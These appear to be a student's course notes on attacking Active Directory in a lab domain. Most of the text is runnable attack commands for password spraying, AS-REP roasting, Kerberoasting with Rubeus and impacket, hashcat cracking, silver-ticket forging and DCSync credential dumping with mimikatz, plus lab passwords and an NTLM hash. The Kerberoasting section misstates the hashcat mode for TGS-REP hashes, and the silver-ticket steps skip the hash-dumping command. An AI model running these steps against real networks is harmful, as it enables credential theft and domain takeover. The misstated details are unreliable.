##### General Notes

- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).
## AD Password Attacks

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

#if valid, object will be created, if not we'll throw an error
```

*use /home/kali/password-spray.ps1 for this*
```
 .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
# or use -file and use a wordlist
```


#### SMB
```
crackmapexec smb 192.168.221.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

## AS-REP Roasting

###### From Kali:

```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```
```
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```



###### From Windows Target:


1. Put on target windows device

```
.\rubeus.exe asreproast
```
![[Pasted image 20231113194001.png]]
## Kerberoasting
use hashcat mode 18200 for TGS-REP hashes

###### From Windows:
If authenticated domain user, will show all SPNs linked with domain user
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
copy and paste output file to kali to hashcat

```
sudo hashcat -m 18200 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

###### From Kali:

From kali, kerberoast against DC ip address with domain user creds
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

*if impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use _ntpdate_[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn3) or _rdate_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn4) to do so.



## Silver Tickets
In this section's example, we'll create a silver ticket to get access to an HTTP SPN resource. As we identified in the previous section, the _iis_service_ user account is mapped to an HTTP SPN. Therefore, the password hash of the user account is used to create service tickets for it. For the purposes of this example, let's assume we've identified that the _iis_service_ user has an established session on CLIENT75 (the box were on)


In general, we need to collect the following three pieces of information to create a silver ticket:

- SPN password hash
- Domain SID
- Target SPN

```
iwr -UseDefaultCredentials http://web04
```

```
#Get the Hash:
privilege::debug
exit

#Obtain Domain SID
whoami /user

#Get Target SPN
The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on WEB04 (_HTTP/web04.corp.com:80_) because we want to access the web page running on IIS.

#Generate Silver Ticket,  on sid, leave of the RID (-1105 at very end)
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

```

Now this works:
```
iwr -UseDefaultCredentials http://web04
```
## Domain Controller Sync
to perform this attack, we need a user that is a member of _Domain Admins_, _Enterprise Admins_, or _Administrators_, because there are certain rights required to start the replication
```

.\mimikatz.exe

#who we want to get creds for, e.g. Dave
lsadump::dcsync /user:corp\dave

kali: hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

lsadump::dcsync /user:corp\Administrator


```


Kali method:
![[Pasted image 20231116185836.png]]
## Exercises To-Do

- [ ] 2.1.1 (page 20)

With username and password:
- [ ] crackmapexec smb 192.168.241.0/24 -u backupuser -p 'DonovanJadeKnight1' -d corp.com
- [ ] impacket-GetUserSPNs -request -dc-ip 192.168.241.70 corp.com/meg
- [ ] 